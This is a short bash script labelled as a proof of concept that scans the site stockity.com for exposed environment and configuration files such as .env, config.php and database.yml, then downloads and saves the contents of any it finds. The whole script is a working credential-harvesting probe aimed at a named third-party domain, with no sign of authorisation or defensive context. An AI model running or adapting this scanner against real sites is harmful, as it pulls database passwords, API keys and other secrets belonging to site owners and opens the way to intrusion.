#!/bin/bash
# Environment File Exposure PoC

echo "[*] Testing environment file exposure on stockity.com"

# Array of common env file names
env_files=(
    ".env"
    ".env.bak"
    ".env.local"
    ".env.production"
    ".env.development"
    ".env.staging"
    "config.php"
    "config.php.bak"
    "config.inc.php"
    "configuration.php"
    "settings.php"
    "database.yml"
    "application.properties"
)

echo "[*] Attempting to access environment files..."
for file in "${env_files[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://stockity.com/$file")
    if [ "$status" == "200" ]; then
        echo "[✓] FOUND: $file ($status)"
        curl -s "https://stockity.com/$file" | head -20 > "env-contents-$file.txt"
        echo "    Saved to env-contents-$file.txt"
    else
        echo "[ ] Not found: $file ($status)"
    fi
done

# Check for exposed .env in subdirectories
echo "[*] Checking common subdirectories..."
dirs=("admin" "api" "config" "includes" "src" "app" "public")
for dir in "${dirs[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://stockity.com/$dir/.env")
    if [ "$status" == "200" ]; then
        echo "[✓] FOUND: /$dir/.env ($status)"
    fi
done
